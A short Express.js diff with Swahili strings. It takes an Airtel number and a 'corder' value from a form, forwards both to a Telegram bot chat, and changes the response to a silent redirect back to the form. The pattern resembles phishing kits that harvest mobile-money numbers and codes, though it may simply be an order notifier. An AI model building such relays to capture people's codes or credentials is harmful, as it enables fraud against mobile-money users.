@@ -13,6 +13,6 @@ app.post('/submit', async (req, res) => {
   const { airtelNumero, corder } = req.body;
   const message = `📦 *CORDER MPYA IMEINGIA* 📦\n\n*Airtel Numero*: ${airtelNumero}\n*Corder*: ${corder}\n\n⏰ ${new Date().toLocaleString("sw-TZ")}`;
   await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
-  res.send('<h2>✅ Imetumwa! Asante.</h2><a href="/">Rudi nyuma</a>');
+  res.redirect('/');  // <-- HII NDIO TUMEBADILI
 });
 app.listen(PORT, () => console.log(`Running on ${PORT}`));
